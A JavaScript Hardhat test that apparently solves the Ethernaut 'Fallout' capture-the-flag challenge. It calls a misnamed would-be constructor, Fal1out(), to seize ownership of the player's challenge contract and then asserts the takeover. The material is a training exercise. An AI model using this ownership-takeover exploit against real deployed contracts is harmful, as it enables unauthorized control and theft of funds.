const { assert } = require("chai")
const { ethers } = require("hardhat")
require("dotenv").config()

let player, challenge, challengeAddress, tx

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]
    const challengeFactory = await ethers.getContractFactory(`Fallout`)
    challengeAddress = process.env.CHALLENGEADDRESS2 //address of my instance contract
    challenge = await challengeFactory.attach(challengeAddress)
})

it("Solves the challenge 'Fallout'", async () => {
    /* Call function which make us an owner of the contract.
    Because in this contract someone forgot about keyword
    'constructor' we could use Fal1out like a normal function.*/

    tx = await challenge.Fal1out()
    await tx.wait(1)

    // Check if we our address is the owner
    let owner = await challenge.owner()
    assert(player.address == owner, "Player's address is not owner of contract")
})
